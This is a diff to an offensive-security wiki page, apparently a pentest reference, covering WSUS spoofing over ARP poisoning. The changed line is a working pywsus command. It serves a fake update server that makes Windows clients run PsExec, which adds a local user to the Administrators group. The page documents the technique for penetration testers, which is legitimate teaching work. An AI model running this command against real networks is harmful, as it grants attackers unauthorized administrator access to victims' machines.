@@ -36,7 +36,7 @@ In a scenario where the clients and the attacker are on the same subnet, and the
 The evil WSUS server needs to be started before doing any ARP poisoning. The [pywsus ](https://github.com/GoSecure/pywsus)(Python) utility can be used for that matter.
 
 ```bash
-python3 pywsus.py --host $network_facing_ip --port 8530 --executable /path/to/PsExec64.exe --command '/accepteula /s cmd.exe /c "net user testuser somepassword /add && net localgroup Administrators testuser /add"'
+python3 pywsus.py --host $ATTACKER_IP --port 8530 --executable /path/to/PsExec64.exe --command '/accepteula /s cmd.exe /c "net user $USER $PASSWORD /add && net localgroup Administrators $USER /add"'
 ```
 
 Programs other than PsExec.exe can be used here. Using built-in programs features to bypass security restrictions or operate attacks like this is called [Living off the land](../../../infra/privilege-escalation/windows/living-off-the-land) (LOL). Other Windows LOL binaries and scripts (a.k.a. LOLbins or LOLbas) can be found on [lolbas-project.github.io](https://lolbas-project.github.io).
